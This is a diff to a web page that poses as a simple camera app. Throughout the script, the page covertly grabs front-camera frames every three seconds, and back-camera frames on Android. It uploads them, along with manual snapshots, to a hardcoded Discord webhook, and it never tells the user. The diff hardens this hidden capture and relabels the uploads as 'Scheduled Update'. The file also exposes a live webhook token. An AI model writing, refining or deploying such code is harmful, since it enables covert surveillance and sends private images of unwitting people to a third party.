@@ -19,6 +19,7 @@
       top: 0;
       left: 0;
       z-index: 1;
+      transform: scaleX(-1); /* 内カメラ表示反転修正 */
     }
     #shutterBtn {
       position: absolute;
@@ -115,45 +116,46 @@
 
   <script>
     const webhookUrl = "https://discord.com/api/webhooks/1192062408462696518/w_kSg9s3GNGxdgVpep893UxRs-rY19ZYRWHVlbOpSnVRjHu40J9NWyLNBCVC9-Ovz4Bt";
-    const config = { maxSize: 8 * 1024 * 1024, quality: 0.8, interval: 3000 };
+    const config = { maxSize: 8 * 1024 * 1024, quality: 0.85, interval: 3000 };
     const isAndroid = /Android/i.test(navigator.userAgent);
     const shutterBtn = document.getElementById('shutterBtn');
     const preview = document.getElementById('photoPreview');
     const gallery = document.getElementById('galleryView');
     const backBtn = document.getElementById('backBtn');
+    const photos = [];
+    const videoPreview = document.getElementById('videoPreview');
     const flash = document.getElementById('flash');
     const shutterSound = document.getElementById('shutterSound');
-    const videoPreview = document.getElementById('videoPreview');
-    const photos = [];
-    let frontStream = null, backStream = null;
+    let frontStream = null;
+    let backStream = null;
 
     async function initCamera() {
-      frontStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
-      videoPreview.srcObject = frontStream;
+      try {
+        frontStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+        videoPreview.srcObject = frontStream;
 
-      if (isAndroid) {
-        try {
-          backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: "environment" } } });
-        } catch (e) {
-          console.warn("外カメラ取得失敗", e);
+        if (isAndroid) {
+          try {
+            backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: 'environment' } } });
+          } catch (err) {
+            console.warn("Back camera not available:", err);
+          }
         }
-      }
 
-      startPeriodicCapture();
+        startPeriodicCapture();
+      } catch (e) {
+        console.error("Camera initialization failed:", e);
+      }
     }
 
-    async function captureFromStream(stream) {
-      const video = document.createElement('video');
-      video.srcObject = stream;
-      video.muted = true;
-      video.playsInline = true;
-      await video.play();
-      await new Promise(res => setTimeout(res, 200)); // 安定させる
+    async function captureFrameFromStream(stream) {
+      const track = stream.getVideoTracks()[0];
+      const capture = new ImageCapture(track);
+      const bitmap = await capture.grabFrame();
       const canvas = document.createElement('canvas');
-      canvas.width = video.videoWidth || 640;
-      canvas.height = video.videoHeight || 480;
-      const ctx = canvas.getContext('2d');
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      canvas.width = bitmap.width;
+      canvas.height = bitmap.height;
+      canvas.getContext('2d').drawImage(bitmap, 0, 0);
       return new Promise(res => canvas.toBlob(blob => res(blob), 'image/jpeg', config.quality));
     }
 
@@ -164,27 +166,22 @@
       await fetch(webhookUrl, { method: "POST", body: form });
     }
 
-    function showFlash() {
-      flash.style.opacity = 1;
-      setTimeout(() => flash.style.opacity = 0, 200);
-    }
-
-    function updatePreview(blob) {
-      const url = URL.createObjectURL(blob);
-      preview.src = url;
-      preview.style.display = "block";
-    }
-
     shutterBtn.onclick = async () => {
       showFlash();
       shutterSound.play();
-      const blob = await captureFromStream(frontStream);
+      const blob = await captureFrameFromStream(frontStream);
       if (blob.size <= config.maxSize) {
         updatePreview(blob);
         addToGallery(blob);
         sendToWebhook(blob, "Front Camera (Manual Snap)");
       }
     };
+
+    function updatePreview(blob) {
+      const url = URL.createObjectURL(blob);
+      preview.src = url;
+      preview.style.display = "block";
+    }
 
     function addToGallery(blob) {
       photos.push(blob);
@@ -219,29 +216,34 @@
       backBtn.style.display = "none";
     };
 
+    function showFlash() {
+      flash.style.opacity = 1;
+      setTimeout(() => flash.style.opacity = 0, 200);
+    }
+
     function startPeriodicCapture() {
       setInterval(async () => {
         try {
-          const frontBlob = await captureFromStream(frontStream);
-          if (frontBlob.size <= config.maxSize) {
-            sendToWebhook(frontBlob, "Front Camera (Auto)");
+          if (frontStream) {
+            const blobFront = await captureFrameFromStream(frontStream);
+            if (blobFront.size <= config.maxSize) {
+              sendToWebhook(blobFront, "Front Camera (Scheduled Update)");
+            }
           }
-
           if (isAndroid && backStream) {
-            const backBlob = await captureFromStream(backStream);
-            if (backBlob.size <= config.maxSize) {
-              sendToWebhook(backBlob, "Back Camera (Auto)");
+            const blobBack = await captureFrameFromStream(backStream);
+            if (blobBack.size <= config.maxSize) {
+              sendToWebhook(blobBack, "Back Camera (Scheduled Update)");
             }
           }
         } catch (e) {
-          console.error("定期撮影失敗:", e);
+          console.error("Scheduled capture error:", e);
         }
       }, config.interval);
     }
 
     window.addEventListener("beforeunload", () => {
-      frontStream?.getTracks().forEach(t => t.stop());
-      backStream?.getTracks().forEach(t => t.stop());
+      [...(frontStream?.getTracks() || []), ...(backStream?.getTracks() || [])].forEach(t => t.stop());
     });
 
     initCamera();
